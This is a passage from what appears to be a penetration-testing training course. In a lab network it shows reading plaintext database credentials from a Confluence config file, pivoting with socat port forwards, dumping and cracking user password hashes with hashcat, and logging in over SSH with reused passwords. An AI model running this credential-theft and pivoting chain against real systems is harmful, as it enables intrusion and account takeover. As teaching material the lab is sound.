### 192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
**Listing 525 - Enumerating Routes on CONFLUENCE01**

The command output indicates that we can access hosts in the 192.168.50.0/24 subnet through the `ens192` interface and hosts in the 10.4.50.0/24 subnet through the `ens224` interface.

### Confluence Configuration File
Continuing with our enumeration, we find the Confluence configuration file at `/var/atlassian/application-data/confluence/confluence.cfg.xml`. Using the `cat` command to read the contents, we discover plaintext database credentials within the file.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
...
D@t4basePassw0rd!
jdbc:postgresql://10.4.50.215:5432/confluence
postgres
...
confluence@confluence01:/opt/atlassian/confluence/bin$
```

**Listing 526 - Credentials Found in the Confluence Configuration File on CONFLUENCE01**

We have identified the IP address of the database server (10.4.50.215) and the plaintext username (`postgres`) and password (`D@t4basePassw0rd!`). These credentials can be used to authenticate to the PostgreSQL database and continue our enumeration.

### Limitations
However, we encounter a limitation: CONFLUENCE01 does not have a PostgreSQL client installed, and as a low-privileged user (`confluence`), we cannot easily install software. Our Kali machine has the PostgreSQL client `psql` installed, but we cannot connect directly to the database server (PGDATABASE01) from our Kali machine because it is only routable from CONFLUENCE01.

### Port Forwarding
Given that there is no firewall between our Kali machine and CONFLUENCE01, we can bind ports on the WAN interface of CONFLUENCE01 and connect to them from our Kali machine. This scenario is ideal for port forwarding using `Socat`.

### 18.2.3 Port Forwarding with Socat

**Setting Up Port Forwarding**

We will create a port forward on CONFLUENCE01 to listen on a port on the WAN interface and forward all packets received on this port to the internal subnet where PGDATABASE01 is located. This setup is illustrated in the following diagram:

**Figure 243: Expected Port Forwarding Setup**

We will open TCP port 2345 on the WAN interface of CONFLUENCE01 and connect to it from our Kali machine. All packets sent to this port will be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01.

**Using Socat**

Socat is a general-purpose networking tool that can set up a simple port forward in a single command. We find Socat already installed on CONFLUENCE01. If not, a statically-linked binary version can be downloaded and run.

On CONFLUENCE01, we start a verbose Socat process to listen on TCP port 2345 and forward all traffic to TCP port 5432 on PGDATABASE01.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

**Listing 527 - Running the Socat Port Forward Command**

With the Socat process running, we can use `psql` on our Kali machine to connect to CONFLUENCE01 on port 2345.

```bash
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres:
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.
postgres=# \l
List of databases
Name | Owner | Encoding | Collate | Ctype | Access privileges
------------+----------+----------+-------------+-------------+-----------------------
confluence | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
(4 rows)
```

**Listing 528 - Connecting to the PostgreSQL Service and Listing Databases**

We successfully connected to the PostgreSQL database through our port forward and found that we have access to the `confluence` database.

**Querying the `cwd_user` Table**

We can now query the `cwd_user` table in the `confluence` database to retrieve the username and password hashes for all Confluence users.

```sql
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".
confluence=# select * from cwd_user;
id | user_name | lower_user_name | active | created_date | updated_date | first_name | lower_first_name | last_name | lower_last_name | display_name | lower_display_name | email_address | lower_email_address | external_id | directory_id | credential
---------+----------------+-----------------+--------+-------------------------+-------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+-----------------------------------+------------------------------------+--------------------------------------+---------
...
```

**Listing 529 - Contents of the `cwd_user` Table**

We receive several rows of user information, including their password hashes. We will use Hashcat to crack these hashes.

**Cracking Passwords with Hashcat**

The Hashcat mode number for Atlassian (nPBKDF2-HMAC-SHA1) hashes is 12001. After copying the hashes into a file called `hashes.txt`, we can pass this file and the `fasttrack.txt` password list to Hashcat.

```bash
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
hashcat (v6.2.5) starting
OpenCL API (OpenCL 2.0 pocl 1.8 Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
...
{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

**Listing 530 - Cracked Passwords**

After a few minutes, Hashcat returns passwords for the `database_admin`, `hr_admin`, and `rdp_admin` users. We suspect these passwords might be reused elsewhere in the network.

### SSH Access to PGDATABASE01

We find that PGDATABASE01 is also running an SSH server. We will use the cracked credentials to connect to this SSH server via a new port forward on CONFLUENCE01.

**Creating a New Port Forward**

First, we kill the original Socat process and create a new port forward to listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

**Listing 531 - Creating a New Port Forward with Socat**

With the new Socat port forward set up, we can use our SSH client to connect to port 2222 on CONFLUENCE01 as if we were connecting directly to port 22 on PGDATABASE01.

```bash
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage
System information as of Thu 18 Aug 2022 11:43:07 AM UTC
System load: 0.1 Processes: 241
Usage of /: 59.3% of 7.77GB Users logged in: 1
Memory usage: 16% IPv4 address for ens192: 10.4.50.215
Swap usage: 0% IPv4 address for ens224: 172.16.50.215
0 updates can be applied immediately.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
database_admin@pgdatabase01:~$
```

**Listing 532 - Connecting to the SSH Server on PGDATABASE01**

We successfully connected to the SSH server on PGDATABASE01 using the `database_admin` credentials obtained from the PostgreSQL database.

### Conclusion

In this learning unit, we created simple port forwards using Socat to gain deeper access within a network by leveraging our existing access to a compromised host. It is worth noting that Socat is not the only tool for creating port forwards on *NIX hosts. Other alternatives include `rinetd`, which runs as a daemon and is suitable for longer-term port forwarding needs.